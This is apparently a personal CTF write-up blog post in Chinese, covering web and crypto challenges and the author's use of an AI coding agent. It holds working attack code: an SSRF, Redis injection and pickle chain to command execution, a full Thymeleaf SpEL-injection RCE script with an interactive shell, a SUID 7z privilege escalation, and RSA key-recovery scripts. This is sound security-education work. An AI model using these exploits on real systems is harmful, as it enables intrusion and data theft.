---
title: 20260314 系统安全赛个人 web&crypto writeup 及 AI Agent 使用感想
date: 2026-03-22 12:33:39
tags:
---

## auth

flask 2.2.3 查到一个 CVE-2023-30861，不过我们这次没用上

注意到疑似 AI 写的前端似乎有意突出 `role=user`，结合题目 `auth` 推测这可能是解题某步的关键

很快可以发现头像上传处可以 `SSRF`，借助 `file://` 可以 `LFI`

翻 `/proc` 发现除了 flask redis 进程外还有一个 python 负责 RPC

获取到 Flask 源码、Redis `dump.rdb`、内部 root XML-RPC 服务源码等，黑盒变半个白盒

审计 flask 源码发现

```python
if session.get('role') != 'admin':
    return '权限不足，需要管理员权限'
```

只看 session，因此考虑伪造 `secret_key`

从 `Redis dump` 提取 flask 的 `secret_key`，用以伪造管理员的 `session`

```json
{'logged_in': True, 'role': 'admin', 'username': 'MM'}
```

两个路由可用

```python
@app.route('/admin/online-users')
@app.route('/admin/users')
```

发现 `/admin/online-users` 进行了受限反序列化，但还是有洞，尝试控制 `r.keys('online_user:*')` 的数据即可

对 redis 不熟，AI 自动化测一下：


> Redis 可被 SSRF 的 CRLF 注入利用
>
> 直接访问：
>
> ```text
> http://127.0.0.1:6379/
> ```
>
> 返回过：
>
> ```text
> -ERR wrong number of arguments for 'get' command
> ```
>
> 这说明：
>
> - SSRF 确实能打到 Redis。
> - `urllib` 发出的 HTTP 请求被 Redis 当成 inline protocol 解析了。
>
> 1. 先写简单值：
>
> ```text
> HSET user:MM role admin
> ```
>
> 结果：
>
> - `MM.role` 成功被改成 `admin`
>
> 2. 再写带空格值：
>
> ```text
> HSET user:MM name "Q TEST"
> ```
>
> 结果：
>
> - `MM.name` 成功变成 `Q TEST`
>
> 3. 再写 `\xHH` 转义：
>
> ```text
> HSET user:MM name "\x48\x45\x58\x20\x4f\x4b"
> ```
>
> 结果：
>
> - `MM.name` 成功变成 `HEX OK`
>
> 这一步证明：
>
> - Redis inline quoted argument 可稳定承载经十六进制转义后的二进制 payload

因此通过 `SSRF + redis + pickle` 可以执行受限命令，例如通过

```python
getattr(
    getattr(
        getattr(OnlineUser, "__init__"),
        "__globals__"
    ).get("requests"),
    "post"
)("http://127.0.0.1:54321/RPC2", xml_body)
```

可以向第三个服务 XML-RPC 发送请求

审计 XML-RPC 源码发现 token 是固定的硬编码

```python
self.auth_token = "mcp_secure_token_b2rglxd"
```

并且有命令执行功能

```python
result = subprocess.run(
    command,
    shell=True,
    capture_output=True,
    text=True,
    timeout=10
)
```

不过难以回显，因此考虑直接以高权限复制一份 flag 再去用最初的 LFI 获取

```python
execute_command("cp /flag /tmp/pwnflag; chmod 644 /tmp/pwnflag")
```

再用 `SSRF LFI` 获取 flag 副本

## thymeleaf

三层

1. PRNG 逆推 admin 口令
2. SpEL 模板注入 RCE
3. SUID 提权读 /flag

#### PRNG 逆推 admin 口令

每 POST /register 一次，PRNG 就往后走 1 步。

冷启动后流程是：

- 第 10 步：admin
- 第 11 到 15 步：内置 user1..user5
- 第 16 步：第一次外部注册

最终初始注册与 admin 相差 6 步，小小 crypto，AI秒了

#### SpEL 模板注入 RCE

最难的一段，基本靠抽奖，首先审计在 `HomeController.java`

```java
@GetMapping({"/admin"})
public String adminPage(HttpSession session,
                        @RequestParam(required = false, defaultValue = "main") String section,
                        Model model) {
    String username = (String) session.getAttribute("username");
    if (!"admin".equals(username)) {
        return "redirect:/";
    }
    String templatePath = "admin :: " + section;
    return templatePath;
}
```

这里直接把用户可控的 `section` 拼到了返回视图名里。

也就是说：

```text
/admin?section=main
```

最终会被 Thymeleaf 当成：

```text
admin :: main
```

有很多注入会被拦，最后引导拷打 AI 搓出的 RCE 脚本如下：

```python
#!/usr/bin/env python3
"""
Minimal Thymeleaf RCE helper.

Flow:
1. Login as admin.
2. Inject a preprocessed Thymeleaf fragment expression into /admin?section=...
3. Use a second-stage SpEL parser pivot to reflectively call Runtime.exec().
4. Base64-encode stdout on the target and decode it locally.

Usage:
    python thymeleaf_exec.py exec
    python thymeleaf_exec.py exec "id"
"""

from __future__ import annotations

import argparse
import base64
import sys
import urllib.error
import urllib.parse
import urllib.request
from http.cookiejar import CookieJar


DEFAULT_BASE_URL = "http://12997a3f-04dd-4044-94d7-f769d45cc076.36.dart.ccsssc.com"
DEFAULT_USERNAME = "admin"
DEFAULT_PASSWORD = "0041013152290433"
USER_AGENT = "Mozilla/5.0 Codex CTF Helper" # codex 的小巧思


def spel_string(value: str) -> str:
    return "'" + value.replace("'", "''") + "'"


def preprocess_wrapper(expr_body: str) -> str:
    escaped = expr_body.replace("\\", "\\\\").replace("'", "\\'")
    return f"__'$'+'{{'+'{escaped}'+'}}'__"


def shell_command_to_argv_literal(command: str) -> str:
    encoded = base64.b64encode(command.encode()).decode()
    shell_argv = f"/bin/sh,-c,echo {encoded}|base64 -d|/bin/sh"
    return f"{spel_string(shell_argv)}.split(',')"


def build_exec_expr(command: str) -> str:
    inner = (
        "{"
        "#r=getClass().getClassLoader().loadClass('java.lang.Runtime').getMethod('getRuntime').invoke(null),"
        f"#a={shell_command_to_argv_literal(command)},"
        "#p=#r.exec(#a),"
        "#s=getClass().getClassLoader().loadClass('java.lang.Process').getMethod('getInputStream').invoke(#p),"
        "#b=getClass().getClassLoader().loadClass('java.io.InputStream').getMethod('readAllBytes').invoke(#s),"
        "#e=getClass().getClassLoader().loadClass('java.util.Base64').getMethod('getEncoder').invoke(null),"
        "#e.getClass().getMethod('encodeToString',#b.getClass()).invoke(#e,#b)"
        "}[6]"
    )
    return (
        "#response.getWriter().print("
        "@webSecurityExpressionHandler.getExpressionParser()"
        f".parseExpression({spel_string(inner)}).getValue(@environment)"
        ")?:'main'"
    )


class ExploitClient:
    def __init__(self, base_url: str, timeout: float) -> None:
        self.base_url = base_url.rstrip("/")
        self.timeout = timeout
        self.cookies = CookieJar()
        self.opener = urllib.request.build_opener(
            urllib.request.HTTPCookieProcessor(self.cookies)
        )
        self.opener.addheaders = [("User-Agent", USER_AGENT)]

    def _open(self, request: urllib.request.Request) -> tuple[int, str]:
        try:
            with self.opener.open(request, timeout=self.timeout) as response:
                body = response.read().decode("utf-8", errors="replace")
                return response.getcode(), body
        except urllib.error.HTTPError as exc:
            body = exc.read().decode("utf-8", errors="replace")
            return exc.code, body

    def login(self, username: str, password: str) -> None:
        data = urllib.parse.urlencode(
            {"username": username, "password": password}
        ).encode()
        request = urllib.request.Request(
            f"{self.base_url}/dologin",
            data=data,
            headers={"Content-Type": "application/x-www-form-urlencoded"},
        )
        self._open(request)

        status, body = self.request_section("main")
        if status != 200 or "bi-speedometer2" not in body:
            raise RuntimeError("admin login failed or session is not authorized")

    def request_section(self, section: str) -> tuple[int, str]:
        url = f"{self.base_url}/admin?section={urllib.parse.quote(section, safe='')}"
        return self._open(urllib.request.Request(url))

    def execute_command(self, command: str, debug: bool = False) -> str:
        status, body = self.request_section(preprocess_wrapper(build_exec_expr(command)))
        if status != 200:
            message = f"server returned HTTP {status}"
            if debug and body:
                message += f"\n{body}"
            raise RuntimeError(message)

        output = extract_prefix_before_fragment(body)
        if output is None:
            if debug and body:
                raise RuntimeError(f"output not found\n{body}")
            raise RuntimeError("output not found")
        return base64.b64decode(output).decode("utf-8", errors="replace")


def extract_prefix_before_fragment(body: str) -> str | None:
    marker = "<div>"
    idx = body.find(marker)
    if idx == -1:
        return None
    prefix = body[:idx]
    return prefix if prefix else None


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(description="Minimal Thymeleaf exec shell")
    parser.add_argument("--base-url", default=DEFAULT_BASE_URL)
    parser.add_argument("--username", default=DEFAULT_USERNAME)
    parser.add_argument("--password", default=DEFAULT_PASSWORD)
    parser.add_argument("--timeout", type=float, default=10.0)
    parser.add_argument("--debug", action="store_true")
    parser.add_argument("mode", choices=["exec"])
    parser.add_argument("command", nargs="?", help="optional command to run first")
    return parser


def repl(client: ExploitClient, initial_command: str | None, debug: bool) -> int:
    if initial_command:
        try:
            output = client.execute_command(initial_command, debug=debug)
            if output:
                sys.stdout.write(output)
                if not output.endswith("\n"):
                    sys.stdout.write("\n")
        except Exception as exc:
            print(f"[!] {exc}", file=sys.stderr)

    while True:
        try:
            command = input("rce$ ").strip()
        except EOFError:
            print()
            return 0
        except KeyboardInterrupt:
            print()
            return 0

        if not command:
            continue
        if command in {"exit", "quit"}:
            return 0

        try:
            output = client.execute_command(command, debug=debug)
        except Exception as exc:
            print(f"[!] {exc}", file=sys.stderr)
            continue

        if output:
            sys.stdout.write(output)
            if not output.endswith("\n"):
                sys.stdout.write("\n")


def main() -> int:
    args = build_parser().parse_args()
    client = ExploitClient(args.base_url, args.timeout)

    try:
        client.login(args.username, args.password)
    except Exception as exc:
        print(f"[!] Login failed: {exc}", file=sys.stderr)
        return 1

    return repl(client, args.command, args.debug)


if __name__ == "__main__":
    raise SystemExit(main())

```

示例执行:

```shell
$ python exp.py exec "whoami"
ctf
```

#### SUID 提权读 /flag

这是 AI 没想到的一点

首先 `ls -la /` 可以看到根目录下权限 `400` 长度 `43` 的 `/flag`，java 进程本身是 `ctf` 用户，正常读是无法读的，AI 在想找泄露点，经验上 `CTF` 里可以优先试试提权。

枚举 SUID

```shell
find / -perm -u=s -type f 2>/dev/null
```

找到

```shell
/bin/mount
/bin/su
/bin/umount
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/7z
```

![1a74185cda2141220d681ffb8db730e8](/image/articles/20260314-系统安全赛个人-web-crypto-writeup-及-AI-Agent-使用感想.assets/1a74185cda2141220d681ffb8db730e8.png)

用这个线索引导 AI 即可立即获取 flag

```shell
/usr/bin/7z a -ttar -an -so /flag 2>/dev/null | /usr/bin/7z e -ttar -si -so 2>/dev/null
```

## RSA

#### level 1

根据提示搓脚本

```python
import glob
import math
import re
from math import isqrt

from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Util.number import bytes_to_long, inverse


def is_square(value):
    if value < 0:
        return False
    root = isqrt(value)
    return root * root == value


def continued_fraction(numerator, denominator):
    while denominator:
        quotient = numerator // denominator
        yield quotient
        numerator, denominator = denominator, numerator - quotient * denominator


def convergents(terms):
    prev_num, prev_den = 1, 0
    curr_num, curr_den = terms[0], 1
    yield curr_num, curr_den
    for term in terms[1:]:
        prev_num, curr_num = curr_num, term * curr_num + prev_num
        prev_den, curr_den = curr_den, term * curr_den + prev_den
        yield curr_num, curr_den


def wiener_attack(n_value, e_value):
    terms = list(continued_fraction(e_value, n_value))
    for k_value, d_value in convergents(terms):
        if k_value == 0:
            continue
        if (e_value * d_value - 1) % k_value != 0:
            continue
        phi_value = (e_value * d_value - 1) // k_value
        sum_pq = n_value - phi_value + 1
        discriminant = sum_pq * sum_pq - 4 * n_value
        if not is_square(discriminant):
            continue
        delta = isqrt(discriminant)
        p_value = (sum_pq + delta) // 2
        q_value = (sum_pq - delta) // 2
        if p_value * q_value == n_value:
            return d_value, p_value, q_value
    return None


def fermat_factor(n_value):
    a_value = isqrt(n_value)
    if a_value * a_value < n_value:
        a_value += 1
    b_squared = a_value * a_value - n_value
    if not is_square(b_squared):
        return None
    b_value = isqrt(b_squared)
    p_value = a_value - b_value
    q_value = a_value + b_value
    if p_value * q_value == n_value:
        return p_value, q_value
    return None


def load_public_keys():
    return {
        path: RSA.import_key(open(path, "rb").read())
        for path in glob.glob("key-*.pem")
    }


def recover_private_keys(public_keys):
    private_keys = {}

    for left_name, right_name in [("key-1.pem", "key-2.pem"), ("key-4.pem", "key-15.pem")]:
        left_key = public_keys[left_name]
        right_key = public_keys[right_name]
        shared_prime = math.gcd(left_key.n, right_key.n)
        if shared_prime == 1:
            continue
        for name, public_key in ((left_name, left_key), (right_name, right_key)):
            other_prime = public_key.n // shared_prime
            phi_value = (shared_prime - 1) * (other_prime - 1)
            d_value = inverse(public_key.e, phi_value)
            private_keys[name] = RSA.construct(
                (public_key.n, public_key.e, d_value, int(shared_prime), int(other_prime))
            )

    for name in ["key-3.pem", "key-7.pem", "key-13.pem", "key-18.pem"]:
        public_key = public_keys[name]
        factors = fermat_factor(public_key.n)
        if factors is None:
            continue
        p_value, q_value = factors
        phi_value = (p_value - 1) * (q_value - 1)
        d_value = inverse(public_key.e, phi_value)
        private_keys[name] = RSA.construct(
            (public_key.n, public_key.e, d_value, int(p_value), int(q_value))
        )

    for name in ["key-6.pem", "key-12.pem", "key-17.pem"]:
        public_key = public_keys[name]
        recovered = wiener_attack(public_key.n, public_key.e)
        if recovered is None:
            continue
        d_value, p_value, q_value = recovered
        private_keys[name] = RSA.construct(
            (public_key.n, public_key.e, int(d_value), int(p_value), int(q_value))
        )

    return private_keys


def decrypt_ciphertext(ciphertext, private_key):
    key_size = (private_key.n.bit_length() + 7) // 8
    if len(ciphertext) <= key_size + 28:
        return None

    rsa_block = ciphertext[:key_size]
    nonce = ciphertext[key_size:key_size + 12]
    body = ciphertext[key_size + 12:-16]
    tag = ciphertext[-16:]

    if private_key.n.bit_length() >= 2048:
        symmetric_key = PKCS1_OAEP.new(private_key).decrypt(rsa_block)
    else:
        key_int = pow(bytes_to_long(rsa_block), private_key.d, private_key.n)
        symmetric_key = key_int.to_bytes(16, "big")

    cipher = AES.new(symmetric_key, AES.MODE_GCM, nonce=nonce)
    return cipher.decrypt_and_verify(body, tag).decode("utf-8")


def recover_plaintexts(private_keys):
    recovered = []
    for ciphertext_path in sorted(glob.glob("ciphertext-*.bin")):
        ciphertext = open(ciphertext_path, "rb").read()
        for key_path, private_key in private_keys.items():
            try:
                plaintext = decrypt_ciphertext(ciphertext, private_key)
            except Exception:
                continue
            recovered.append((ciphertext_path, key_path, plaintext))
            break
    return recovered


def crt_recover(shares):
    modulus_product = 1
    secret_value = 0
    for modulus, residue in shares:
        adjustment = ((residue - secret_value) % modulus) * inverse(modulus_product % modulus, modulus)
        secret_value += modulus_product * (adjustment % modulus)
        modulus_product *= modulus
    return secret_value


def recover_messages(plaintexts):
    line_groups = [plaintext.splitlines() for _, _, plaintext in plaintexts]
    messages = []

    for line_index in range(1, 10):
        shares = []
        bit_length = None
        for lines in line_groups:
            modulus_hex, residue_hex, bit_length_hex = lines[line_index].split(":")
            shares.append((int(modulus_hex, 16), int(residue_hex, 16)))
            bit_length = int(bit_length_hex, 16)

        secret_value = crt_recover(shares)
        byte_length = (bit_length + 7) // 8
        message = secret_value.to_bytes(byte_length, "big").decode("utf-8")
        messages.append(message)

    return messages


def main():
    public_keys = load_public_keys()
    private_keys = recover_private_keys(public_keys)
    plaintexts = recover_plaintexts(private_keys)

    print("Recovered plaintexts:")
    for ciphertext_path, key_path, _ in plaintexts:
        print(f"  {ciphertext_path} <- {key_path}")

    messages = recover_messages(plaintexts)
    print("\nRecovered messages:")
    for index, message in enumerate(messages, start=2):
        print(f"message{index}: {message}")

    password_match = re.search(r"next pass is\s+([^。.!?\s]+)", messages[5])
    if password_match:
        print(f"\nlevel2.zip password: {password_match.group(1)}")


if __name__ == "__main__":
    main()


# Recovered plaintexts:
#   ciphertext-1.bin <- key-3.pem
#   ciphertext-2.bin <- key-6.pem
#   ciphertext-3.bin <- key-4.pem
#   ciphertext-4.bin <- key-7.pem
#   ciphertext-5.bin <- key-17.pem
#   ciphertext-8.bin <- key-1.pem
#   ciphertext-9.bin <- key-18.pem

# Recovered messages:
# message2: Another success! One more cipher bites the dust!
# message3: You're nearly there! Keep going! 3!
# message4: You're nearly there! Keep going! 4!
# message5: You're nearly there! Keep going! 5!
# message6: You're nearly there! Keep going! 6!
# message7: Congratulations! next pass is 9Zr4M1ThwVCHe4nHnmOcilJ8。
# message8: You're nearly there! Keep going! 8!
# message9: You're nearly there! Keep going! 9!
# message10: You're nearly there! Keep going! 10!

# level2.zip password: 9Zr4M1ThwVCHe4nHnmOcilJ8
```

#### level 2

首先可以直接爆破 $[-bounds, +bounds] = [-100, +100]$ 还原 P2 P3 多项式的系数

```python
# sage

from Crypto.Util.number import bytes_to_long

n = 99573363048275234764231402769464116416087010014992319221201093905687439933632430466067992037046120712199565250482197004301343341960655357944577330885470918466007730570718648025143561656395751518428630742587023267450633824636936953524868735263666089452348466018195099471535823969365007120680546592999022195781
e = 12076830539295193533033212232487568888200963123024189287629493480058638222146972496110814372883829765692623107191129306190788976704250502316265439996891764101447017190377014980293589797403095249538391534986638973035285900867548420192211241163778919028921502305790979880346050428839102874086046622833211913299
c2 = 94664119872856479106437852390497826718494891787231788048637569911820802241271385500237521849783257742020074596801243551199558780516078698265978603364906102405513805258523893161481880920117078266554039648951735640682344760175446065823258414274759467738667667682764189886842676476993302026419523097311062869020
c3 = 17452842791128500883484238194649202112170709841838938382334668085116735124742824096780522905501631340623564870573855325492444043679562915249332054460794149403631363005265204604824764244033832504758820981926933304283896441280291037649477532990161765794023799333588888734136298348520144818810380374971149851767

m1 = int(bytes_to_long(b"Secret message: " + b"A" * 16))
poly2_tail = [-36, -94]
poly3_tail = [-11, -20, 11]

print('m1 bits =', m1.bit_length())

base2 = (poly2_tail[0] * m1 + poly2_tail[1] * (m1 ** 2)) % n
base3 = (poly3_tail[0] * m1 + poly3_tail[1] * (m1 ** 2) + poly3_tail[2] * (m1 ** 3)) % n

poly2_solutions = []
for a0 in range(-100, 101):
    m2 = (a0 + base2) % n
    if power_mod(m2, e, n) == c2:
        poly2_solutions.append((a0, m2))

poly3_solutions = []
for b0 in range(-100, 101):
    m3 = (b0 + base3) % n
    if power_mod(m3, e, n) == c3:
        poly3_solutions.append((b0, m3))

print('poly2 constant candidates:', poly2_solutions)
print('poly3 constant candidates:', poly3_solutions)

if len(poly2_solutions) == 1:
    print('poly2_coeffs =', [poly2_solutions[0][0], *poly2_tail])

if len(poly3_solutions) == 1:
    print('poly3_coeffs =', [poly3_solutions[0][0], *poly3_tail])


# poly2 constant candidates: [(-93, 99573363048275234764231402769464116416087010014992319221201093905687439933632430466067992037046120712199565250482197004301343341960655357944577330885470784715126722435921158895824665419913269528424690262728739845116112902395244885358750961250230177487431633851514465414044256040642577828582899149891719854950)]
# poly3 constant candidates: [(-62, 590399365140190500740178423662367772903589621587965145437106442287659685984583084035886694058638088624923974452002966178281019771676234250192738895337223105057659985735636036756556266252170949070631521235867134358008101532167944494)]
# poly2_coeffs = [-93, -36, -94]
# poly3_coeffs = [-62, -11, -20, 11]
```

注意到 $d$ 只有 $180$ 位，用 `Boneh-Durfee` 打小私钥攻击

```python
# AI 速搓
debug = False
strict = False
helpful_only = True
dimension_min = 7

def helpful_vectors(BB, modulus):
    nothelpful = 0
    for ii in range(BB.dimensions()[0]):
        if BB[ii, ii] >= modulus:
            nothelpful += 1
    print(nothelpful, '/', BB.dimensions()[0], 'vectors are not helpful')

def matrix_overview(BB, bound):
    for ii in range(BB.dimensions()[0]):
        line = ('%02d ' % ii)
        for jj in range(BB.dimensions()[1]):
            line += '0' if BB[ii, jj] == 0 else 'X'
            if BB.dimensions()[0] < 60:
                line += ' '
        if BB[ii, ii] >= bound:
            line += '~'
        print(line)

def remove_unhelpful(BB, monomials, bound, current):
    if current == -1 or BB.dimensions()[0] <= dimension_min:
        return BB

    for ii in range(current, -1, -1):
        if BB[ii, ii] >= bound:
            affected_vectors = 0
            affected_vector_index = 0

            for jj in range(ii + 1, BB.dimensions()[0]):
                if BB[jj, ii] != 0:
                    affected_vectors += 1
                    affected_vector_index = jj

            if affected_vectors == 0:
                BB = BB.delete_columns([ii])
                BB = BB.delete_rows([ii])
                monomials.pop(ii)
                return remove_unhelpful(BB, monomials, bound, ii - 1)

            if affected_vectors == 1:
                affected_deeper = True
                for kk in range(affected_vector_index + 1, BB.dimensions()[0]):
                    if BB[kk, affected_vector_index] != 0:
                        affected_deeper = False
                if affected_deeper and abs(bound - BB[affected_vector_index, affected_vector_index]) < abs(bound - BB[ii, ii]):
                    BB = BB.delete_columns([affected_vector_index, ii])
                    BB = BB.delete_rows([affected_vector_index, ii])
                    monomials.pop(affected_vector_index)
                    monomials.pop(ii)
                    return remove_unhelpful(BB, monomials, bound, ii - 1)

    return BB

def boneh_durfee(pol, modulus, mm, tt, XX, YY):
    PR = PolynomialRing(ZZ, names=('u', 'x', 'y'))
    u, x, y = PR.gens()
    Q = PR.quotient(x * y + 1 - u)
    polZ = Q(pol).lift()

    UU = XX * YY + 1

    gg = []
    for kk in range(mm + 1):
        for ii in range(mm - kk + 1):
            xshift = x**ii * modulus**(mm - kk) * polZ(u, x, y)**kk
            gg.append(xshift)
    gg.sort()

    monomials = []
    for polynomial in gg:
        for monomial in polynomial.monomials():
            if monomial not in monomials:
                monomials.append(monomial)
    monomials.sort()

    for jj in range(1, tt + 1):
        for kk in range(floor(mm / tt) * jj, mm + 1):
            yshift = y**jj * polZ(u, x, y)**kk * modulus**(mm - kk)
            yshift = Q(yshift).lift()
            gg.append(yshift)

    for jj in range(1, tt + 1):
        for kk in range(floor(mm / tt) * jj, mm + 1):
            monomials.append(u**kk * y**jj)

    nn = len(monomials)
    BB = Matrix(ZZ, nn)
    for ii in range(nn):
        BB[ii, 0] = gg[ii](0, 0, 0)
        for jj in range(1, ii + 1):
            if monomials[jj] in gg[ii].monomials():
                BB[ii, jj] = gg[ii].monomial_coefficient(monomials[jj]) * monomials[jj](UU, XX, YY)

    if helpful_only:
        BB = remove_unhelpful(BB, monomials, modulus**mm, nn - 1)
        nn = BB.dimensions()[0]
        if nn == 0:
            return 0, 0

    if debug:
        helpful_vectors(BB, modulus**mm)
        det = BB.det()
        bound = modulus**(mm * nn)
        if det >= bound:
            print('det(L) is too large')
        else:
            print('det(L) < e^(m*n)')
        matrix_overview(BB, modulus**mm)

    BB = BB.LLL()

    found = False
    pol1 = None
    pol2 = None
    rr = None

    for pol1_idx in range(nn - 1):
        for pol2_idx in range(pol1_idx + 1, nn):
            PRwz = PolynomialRing(ZZ, names=('w', 'z'))
            w, z = PRwz.gens()
            pol1 = 0
            pol2 = 0
            for jj in range(nn):
                pol1 += monomials[jj](w * z + 1, w, z) * BB[pol1_idx, jj] / monomials[jj](UU, XX, YY)
                pol2 += monomials[jj](w * z + 1, w, z) * BB[pol2_idx, jj] / monomials[jj](UU, XX, YY)
            PRq = PolynomialRing(ZZ, names=('q',))
            qvar = PRq.gen()
            rr = pol1.resultant(pol2)
            if rr.is_zero() or rr.monomials() == [1]:
                continue
            found = True
            break
        if found:
            break

    if not found:
        return 0, 0

    rr = rr(qvar, qvar)
    soly = rr.roots()
    if len(soly) == 0:
        return 0, 0

    soly = soly[0][0]
    ss = pol1(qvar, soly)
    solx = ss.roots()[0][0]
    return solx, soly

P = PolynomialRing(ZZ, names=('x', 'y'))
x, y = P.gens()
A = Integer((n + 1) // 2)
pol = 1 + x * (A + y)

delta_bd = RealNumber('0.18')
base_X = 2 * floor(n**delta_bd)
base_Y = floor(n**RealNumber('0.5'))

attempts = [
    (4, int((1 - 2 * delta_bd) * 4), base_X),
    (5, int((1 - 2 * delta_bd) * 5), base_X),
    (6, int((1 - 2 * delta_bd) * 6), base_X),
    (4, int((1 - 2 * delta_bd) * 4), max(2, base_X // 2)),
    (5, int((1 - 2 * delta_bd) * 5), max(2, base_X // 2)),
    (6, int((1 - 2 * delta_bd) * 6), max(2, base_X // 2)),
    (4, int((1 - 2 * delta_bd) * 4), max(2, base_X // 4)),
    (5, int((1 - 2 * delta_bd) * 5), max(2, base_X // 4)),
    (6, int((1 - 2 * delta_bd) * 6), max(2, base_X // 4)),
]

solution = None
for mm, tt, XX in attempts:
    print('trying m =', mm, 't =', tt, 'X bits =', Integer(XX).nbits())
    solx, soly = boneh_durfee(pol, e, mm, tt, XX, base_Y)
    print('raw roots =', solx, soly)
    if solx == 0:
        continue
    if hasattr(soly, 'denominator') and soly.denominator() != 1:
        continue
    pq_sum = Integer(-2 * soly)
    discr = pq_sum * pq_sum - 4 * n
    if discr < 0:
        continue
    sq = isqrt(discr)
    if sq * sq != discr:
        continue
    p = Integer((pq_sum + sq) // 2)
    q = Integer((pq_sum - sq) // 2)
    if p * q != n:
        continue
    solution = (mm, tt, Integer(XX), solx, Integer(soly), p, q, pq_sum)
    break

if solution is None:
    raise ValueError('Boneh-Durfee did not produce a valid p+q in the tested parameter range.')

mm, tt, XX, solx, soly, p, q, pq_sum = solution
lam = lcm(p - 1, q - 1)
d_recovered = inverse_mod(e, lam)

print('solution m,t =', (mm, tt))
print('x =', solx)
print('y =', soly)
print('p =', p)
print('q =', q)
print('recovered d bits =', Integer(d_recovered).nbits())
print('p + q =', pq_sum)

import hashlib
next_pass = hashlib.sha256(str(int(pq_sum)).encode()).hexdigest()
print('next pass is', next_pass)



# trying m = 4 t = 2 X bits = 186
# raw roots = 496258591718074527429170043115095924865510813103833661/2 -10020295495220878073771490384561845649096829673493750624144958177133915585353023383154202880717251284678128613660050987268057731031645192971482072576671459
# solution m,t = (4, 2)
# x = 496258591718074527429170043115095924865510813103833661/2
# y = -10020295495220878073771490384561845649096829673493750624144958177133915585353023383154202880717251284678128613660050987268057731031645192971482072576671459
# p = 10932961240863053140021227333995503042196506533433133299916502568289020826078008576745192725272664686384293526720057562101790406102729886343233171385110689
# q = 9107629749578703007521753435128188255997152813554367948373413785978810344628038189563213036161837882971963700600044412434325055960560499599730973768232229
# recovered d bits = 180
# p + q = 20040590990441756147542980769123691298193659346987501248289916354267831170706046766308405761434502569356257227320101974536115462063290385942964145153342918
# next pass is 2aa9c360df99cbb4209e4dbab5a9f9ffd86d34906e3206fecfdabf0bb7aeb5ac
```

#### level 3

逐位求即可，注意 sagemath 的异或运算符

```python
from Crypto.Util.number import long_to_bytes

n = 3656543170780671302102369785821318948521533232259598029746397061108006818468053676291634112787611176554924353628972482471754519193717232313848847744522215592281921147297898892307445674335249953174498025904493855530892785669281622228067328855550222457290704991186404511294392428626901071668540517391132556632888864694653334853557764027749481199416901881332307660966462957016488884047047046202519520508102461663246328437930895234074776654459967857843207320530170144023056782205928948050519919825477562514594449069964098794322005156920839848615481717184615581471471105167310877784107653826948801838083937060929103306952084786982834242119877046219260840966142997264676014575104231122349770882974818427591538551719990220347345614399639643257685591321500648437402084919467346049683842042993975696447711080289559063959271045082506968532103445241637971734173037224394103944153692310048043693502870706225319787902231218954548412018259
e = 65537
c = 1757914668604154089701710446907445787512346500378259224658947923217272944211214757488735053484213917067698715050010452193463598710989123020815295814709518742755820383364097695929549366414223421242599840755441311771835982431439073932340356341636346882464058493459455091691653077847776771631560498930589569988646613218910231153610031749287171649152922929066828605655570431656426074237261255561129432889318700234884857353891402733791836155496084825067878059001723617690872912359471109888664801793079193144489323455596341708697911158942505611709946252101670450796550313079139560281843612045681545992626944803230832776794454353639122595107671267859292222861367326121435154862607517890329925621367992667728899878422037182817860641530146234730196633237339901726508906733897556146751503097127672718192958642776389691940671356367304182825433592577899881444815062581163386947075887218537802483045756886019426749855723715192981635971943
leak = 153338022210585970687495444409227961261783749570114993931231317427634321118309600575903662678286698071962304436931371977179197266063447616304477462206528342008151264611040982873859583628234755013757003082382562012219175070957822154944231126228403341047477686652371523951028071221719503095646413530842908952071610518530005967880068526701564472237686095043481296201543161701644160151712649014052002012116829110394811586873559266763339069172495704922906651491247001057095314718709634937187619890550086009706737712515532076

CONST1 = 0xDEADBEEFCAFEBABE123456789ABCDEFFEDCBA9876543210
CONST2 = 0xCAFEBABEDEADBEEF123456789ABCDEF0123456789ABCDEF
CONST3 = 0x123456789ABCDEFFEDCBA9876543210FEDCBA987654321
MOD128 = 1 << 128
MASK64 = (1 << 64) - 1

print('n bits =', n.nbits())
print('leak bits =', leak.nbits())



def leak_mod_mask(p_value, q_value, mask):
    mixed = (
        (p_value * CONST1) ## use sagemath
        ^^ (q_value * CONST2)
        ^^ ((p_value & q_value) << 64)
        ^^ ((p_value | q_value) << 48)
        ^^ ((p_value ^^ q_value) * CONST3)
    )
    return ((mixed + ((p_value + q_value) % MOD128)) ^^ ((p_value * q_value) & MASK64)) & mask

candidates = [(Integer(1), Integer(1))]

for bit_index in range(1, 1536):
    modulus = Integer(1) << (bit_index + 1)
    mask = modulus - 1
    target_n = n & mask
    target_leak = leak & mask
    next_candidates = []
    seen = set()

    for p_low, q_low in candidates:
        for p_bit in (0, 1):
            for q_bit in (0, 1):
                trial_p = p_low | (Integer(p_bit) << bit_index)
                trial_q = q_low | (Integer(q_bit) << bit_index)

                if ((trial_p * trial_q) & mask) != target_n:
                    continue
                if leak_mod_mask(trial_p, trial_q, mask) != target_leak:
                    continue

                key = (int(trial_p), int(trial_q))
                if key not in seen:
                    seen.add(key)
                    next_candidates.append((trial_p, trial_q))

    candidates = next_candidates
    if len(candidates) != 1:
        print('bit', bit_index + 1, 'candidate count =', len(candidates))

    if not candidates:
        raise ValueError(f'No candidate survives at bit {bit_index + 1}.')

p, q = candidates[0]
print('final candidate count =', len(candidates))
print('p * q == n ->', p * q == n)



phi = (p - 1) * (q - 1)
d = inverse_mod(e, phi)
m = power_mod(c, d, n)
flag = long_to_bytes(int(m))

print('p =', p)
print('q =', q)
print('d bits =', Integer(d).nbits())
print('flag =', flag.decode())

# n bits = 3072
# leak bits = 1722
# final candidate count = 1
# p * q == n -> True
# p = 1707409731376314795999673399644896831773113631916193464259935767498639233398656041693151647684636824933980722820855222725690297941643517419906221825861730073489224554305559179283922396783611098752937409830400941648419260598819028494552512482509512236956144966960506482426135682006340832164470103583395459735070745893411476234089404558564875229768662461905874150673437533528191205114624917667791799816966017830043080586780620851038224028348188524334138215456616749
# q = 2141573345627585371553787251648053741410445905256360451856340437573603641142767425814601119975790360922588103737873793493614076837288293103777795188569218362732735616305950754442774259470221411601014586798147206055920156749954034989669601788173864983031343224818275175942690789067112461738865540083192521838275489406927966810543155749231403489582462847315255827362973792259727757243033997062234932720733059810639405260209480382634232650958389211775287627610180991
